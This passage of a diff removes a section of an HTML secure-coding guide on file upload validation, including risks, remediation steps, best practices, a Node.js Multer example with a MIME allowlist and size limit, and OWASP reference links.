-                <h3>✅ How is File Validation Used?</h3>
-                <p>File validation is the process of checking uploaded files to ensure they conform to expected criteria such as:</p>
-                <p><b>File type validation:</b> Confirming the file extension and MIME type match allowed types (e.g., .jpg, .png, .pdf).</p>
-                <p><b>File size validation:</b> Enforcing size limits to prevent resource exhaustion.</p>
-                <p><b>File content validation:</b> Optionally inspecting file contents to detect malicious code.</p>
-                <p><b>Filename sanitization:</b> Removing or restricting harmful characters to prevent path traversal or injection.</p>
-                <p><b>Storage location control:</b> Ensuring uploaded files are stored in secure, non-executable directories.</p>
-                
-                <div class="warning-box">
-                    <h3>⚠️ Impact if File Validation Is Not Implemented</h3>
-                    <p><b>Remote Code Execution (RCE):</b> Attackers can upload and execute malicious scripts on the server.</p>
-                    <p><b>Malware Distribution:</b> The system can become a source for spreading malware.</p>
-                    <p><b>Denial of Service (DoS):</b> Uploading very large or numerous files can exhaust server resources.</p>
-                    <p><b>Data Breach or Defacement:</b> Malicious files may lead to data leaks or unauthorized site modification.</p>
-                    <p><b>Unauthorized Access:</b> Exploiting uploaded files to escalate privileges.</p>
-                </div>
-                
-                <div class="remediation-box">
-                    <h3>🛠️ Remediation of the Issue</h3>
-                    <p>1. Strictly validate file type and MIME type to accept only known safe formats.</p>
-                    <p>2. Enforce file size limits to control resource use.</p>
-                    <p>3. Sanitize file names or generate safe random names.</p>
-                    <p>4. Store uploaded files outside the web root to prevent direct execution.</p>
-                    <p>5. Scan uploaded files with antivirus/malware scanners if possible.</p>
-                    <p>6. Implement authentication and authorization for upload endpoints.</p>
-                    <p>7. Log upload activity to detect suspicious behavior.</p>
-                </div>
-                
-                <h3>🚀 How to Implement File Upload Validation and Best Practices</h3>
-                <p><b>Validate File Type and MIME Type:</b> Check both the file extension and the MIME type (provided by the client or verified on server side).</p>
-                <p><b>Limit File Size:</b> Reject files exceeding the defined maximum size.</p>
-                <p><b>Sanitize Filenames:</b> Remove special characters or use generated unique names (e.g., UUIDs).</p>
-                <p><b>Store Files Securely:</b> Place uploaded files in directories not directly accessible or executable by the web server.</p>
-                <p><b>Scan for Malware:</b> Use antivirus APIs or tools for scanning uploaded files.</p>
-                <p><b>Use HTTPS:</b> Secure upload process against interception.</p>
-                <p><b>Set Proper Permissions:</b> Ensure upload folders have restricted permissions (no execute).</p>
-                <p><b>Monitor and Log Uploads:</b> Keep track of file uploads for auditing.</p>
-                
-                <h3>Example (Node.js + Multer):</h3>
-                <pre><code>const multer = require('multer');
-const path = require('path');
 
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    cb(null, 'uploads/'); // Store outside web root if possible
-  },
-  filename: (req, file, cb) => {
-    const ext = path.extname(file.originalname);
-    const safeName = Date.now() + '-' + Math.round(Math.random() * 1E9) + ext;
-    cb(null, safeName);
-  }
-});
-
-const fileFilter = (req, file, cb) => {
-  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
-  if (allowedTypes.includes(file.mimetype)) {
-    cb(null, true);
-  } else {
-    cb(new Error('Invalid file type'), false);
-  }
-};
-
-const upload = multer({
-  storage,
-  limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB limit
-  fileFilter
-});</code></pre>
-                
-                <h3>🔗 Reference Links:</h3>
-                <p><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</a></p>
-                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST#uploading_files">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST#uploading_files</a></p>
-                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</a></p>
-            </div>
 
             <!-- Topic 3: Secure Cookies -->
             <div id="secure-cookies" class="topic-card">
